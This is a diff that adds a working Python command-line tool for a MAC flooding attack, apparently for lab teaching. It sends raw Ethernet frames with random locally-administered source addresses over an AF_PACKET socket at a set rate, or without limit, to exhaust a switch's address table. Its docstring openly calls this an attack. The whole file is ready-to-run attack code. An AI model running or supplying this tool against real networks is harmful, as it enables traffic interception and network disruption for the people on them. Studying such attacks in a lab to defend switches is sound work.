@@ -1,0 +1,90 @@
+#!/usr/bin/env python3
+"""Flood a switch's MAC learning table from random source addresses.
+
+    mac-flood <interface> <frames> <pps>
+
+    interface   the NIC to send on
+    frames      how many frames to send; 0 sends until interrupted
+    pps         frames per second; 0 sends as fast as the socket accepts them
+
+Every frame carries a source address the switch has never seen, which is the only
+field that matters: a switch learns the source address of each frame against the
+port it arrived on, so each frame costs one table entry. The destination is random
+too, so nothing here is ever delivered to a real host; the frames exist to be
+learned from, not to arrive.
+
+There are no default arguments. Flooding an interface at a rate is the whole
+attack, so naming the interface and the rate is the learner's decision to make.
+"""
+
+import random
+import socket
+import sys
+import time
+
+ETH_P_IPV4 = 0x0800
+MIN_PAYLOAD = 46  # 14-byte header + 46 = the 60-byte minimum before the FCS
+
+
+def random_mac(multicast_ok=False):
+    """Six random bytes. The first byte's low two bits are the multicast and
+    locally-administered flags: multicast is cleared so the frame is a unicast the
+    switch will learn from and try to forward, and locally-administered is set so
+    the address cannot collide with a real vendor-assigned one."""
+    first = random.getrandbits(8) & 0xFE  # clear the multicast bit
+    if not multicast_ok:
+        first |= 0x02  # set the locally-administered bit
+    return bytes([first]) + bytes(random.getrandbits(8) for _ in range(5))
+
+
+def main(argv):
+    if len(argv) != 4:
+        sys.stderr.write("usage: mac-flood <interface> <frames> <pps>\n")
+        return 2
+    iface = argv[1]
+    try:
+        frames = int(argv[2])
+        pps = int(argv[3])
+    except ValueError:
+        sys.stderr.write("frames and pps must be whole numbers\n")
+        return 2
+    if frames < 0 or pps < 0:
+        sys.stderr.write("frames and pps must not be negative\n")
+        return 2
+
+    try:
+        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
+        sock.bind((iface, 0))
+    except OSError as exc:
+        sys.stderr.write("cannot send on %s: %s\n" % (iface, exc))
+        return 1
+
+    payload = bytes(MIN_PAYLOAD)
+    ethertype = ETH_P_IPV4.to_bytes(2, "big")
+    sent = 0
+    started = time.time()
+    try:
+        while frames == 0 or sent < frames:
+            sock.send(random_mac(multicast_ok=True) + random_mac() + ethertype + payload)
+            sent += 1
+            # Pace against elapsed time rather than sleeping per frame: a sleep
+            # every frame would cap the rate at a few thousand a second whatever
+            # was asked for.
+            if pps and sent % 200 == 0:
+                due = started + sent / pps
+                now = time.time()
+                if due > now:
+                    time.sleep(due - now)
+    except KeyboardInterrupt:
+        pass
+    finally:
+        sock.close()
+
+    elapsed = time.time() - started
+    rate = sent / elapsed if elapsed > 0 else 0.0
+    print("sent %d frames on %s in %.2fs (%.0f frames/s)" % (sent, iface, elapsed, rate))
+    return 0
+
+
+if __name__ == "__main__":
+    sys.exit(main(sys.argv))
